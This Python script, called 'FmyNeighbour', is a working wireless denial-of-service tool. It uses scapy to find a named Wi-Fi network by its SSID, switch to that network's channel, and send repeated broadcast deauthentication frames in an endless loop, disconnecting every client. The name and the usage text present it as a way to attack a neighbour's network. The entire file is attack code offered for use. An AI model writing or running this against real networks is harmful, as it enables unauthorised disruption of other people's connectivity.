#!/usr/bin/env python
# FmyNeighbour
#Developed by @hcjuan04 - twitter
# Credits Airoscapy for channel hooper and and most of the packet analisys method
# Also credits to @RaiderSec

import sys, os, signal
from multiprocessing import Process
import codecs
import commands
import time
import datetime

from scapy.all import *

interface='' # monitor interface
bssid='' # monitor interface
ssidarg = '' # SSID to adudit
channel = 1

p= None

# process unique sniffed Beacons and ProbeResponses. 
def sniffAP(p):
    if ( (p.haslayer(Dot11Beacon) or p.haslayer(Dot11ProbeResp))):
        ssid       = p[Dot11Elt].info
        bbssid     = p[Dot11].addr3    
        cchannel   = int( ord(p[Dot11Elt:3].info))
        capability = p.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}\
                {Dot11ProbeResp:%Dot11ProbeResp.cap%}")
        # Check for encrypted networks
        if re.search("privacy", capability): enc = 'Y'
        else: enc  = 'N'
	global ssidarg
	global channel
	global bssid
        if ssid.strip() == ssidarg :
		channel = cchannel
		bssid = bbssid
		print "CH ENC BSSID             SSID"
		print "%02d  %s  %s %s" % (int(channel), enc, bssid, ssid)
    
       

	
# Channel hopper
def channel_hopper():
    while True:
        try:
            channel = random.randrange(1,15)
            os.system("iw dev %s set channel %d" % (interface, channel))
            time.sleep(1)
        except OSError :
            break

# Capture interrupt signal and cleanup before exiting
def signal_handler(signal, frame):
    global p	
    p.terminate()
    p.join()


# Deauthentication method for Unauthorized APs
def deauth(bssid, client, count):
	pckt = Dot11(subtype=12, addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
	cli_to_ap_pckt = None
	if client != 'FF:FF:FF:FF:FF:FF' : 
		cli_to_ap_pckt = Dot11(subtype=12, addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth(reason=7)
	print 'Sending Deauth to ' + client + ' from ' + bssid
	if not count: 
		print 'Press CTRL+C to quit'
	while count != 0:
		try:
			for i in range(64):
				# Send out deauth from the AP
				send(pckt)
				if client != 'FF:FF:FF:FF:FF:FF': 
					send(cli_to_ap_pckt)
			count -= 1
		except KeyboardInterrupt:
			break
def main() :
    # Reset global variables
    try :
	    while True :
		    
		    # Start the channel hopper
		    global p
		    p = Process(target = channel_hopper)
		    p.start()
		    # Capture timer
		    signal.signal(signal.SIGALRM, signal_handler)
		    signal.alarm(17)
		    # Start the sniffer
		    global interface
		    global channel
		    global bssid
		    sniff(iface=interface,prn=sniffAP,timeout=15)
		    #print "Sniff finished"
		    time.sleep(3) #Wait for Alarm
		    conf.iface=interface
		    os.system("iw dev %s set channel %d" % (interface, channel))
		    print "set card command: iw dev %s set channel %d" % (interface, channel)
		    deauth(bssid, 'FF:FF:FF:FF:FF:FF', 1)
		    print "deauthorization attack sent"
		    
    except KeyboardInterrupt:
    	    print "FmyNeighbour terminated"
			    	    

    
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print "Usage %s monitor_interface SSID_to_F" % sys.argv[0]
        sys.exit(1)
    interface = sys.argv[1]
    ssidarg = sys.argv[2]
    print ssidarg
    # Print the program header
    print ""
    print "======= ~~~~~~FmyNeighbour~~~~~~~ ======="
    #==================DEBUG
    #import pdb
    #pdb.set_trace()
    main()
